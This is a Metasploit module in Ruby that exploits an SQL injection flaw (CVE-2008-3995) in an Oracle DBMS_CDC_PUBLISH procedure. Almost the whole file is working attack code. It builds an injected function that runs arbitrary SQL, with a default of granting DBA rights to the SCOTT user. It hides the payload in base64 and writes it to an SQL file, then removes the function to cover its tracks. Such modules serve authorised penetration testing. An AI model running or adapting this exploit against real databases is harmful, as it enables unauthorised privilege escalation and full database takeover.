##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT
	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE.',
			'Description'    => %q{
				This module exploits an sql injection flaw in the ALTER_AUTOLOG_CHANGE_SOURCE
				procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute
				privilege on the vulnerable package can exploit this vulnerability.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision:$',
			'References'     =>
				[
					[ 'CVE', '2008-3995' ],
					[ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ],
				],
			'DisclosureDate' => 'Oct 22 2008'))

			register_options( 
				[
					OptString.new('SQL',      [ false, 'The SQL to execute.',  'GRANT DBA TO SCOTT']),
					OptString.new('FILENAME', [ false, 'The file name.',  'msf.sql']),
					OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
				], self.class)
	end

	def run

		name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)

		function = %Q|
			CREATE OR REPLACE FUNCTION #{name}
			RETURN VARCHAR2 AUTHID CURRENT_USER
			IS
			PRAGMA AUTONOMOUS_TRANSACTION; 
			BEGIN EXECUTE IMMEDIATE '#{datastore['SQL']}'; 
			COMMIT; 
			RETURN NULL;
			END;
			|

		package = "BEGIN SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE('''||'||user||'.#{name}||''');END;"

		uno = Rex::Text.encode_base64(function)
		dos = Rex::Text.encode_base64(package)	

		sql = %Q|
			DECLARE
			#{rand1} VARCHAR2(32767);
			#{rand2} VARCHAR2(32767);		
			BEGIN
			#{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{uno}')));
			EXECUTE IMMEDIATE #{rand1};
			#{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));
			EXECUTE IMMEDIATE #{rand2};
			END;
			/
			DROP FUNCTION #{name};
			|

		print_status("Creating '#{datastore['FILENAME']}' file ...")		
		file_create(sql)
	end

end
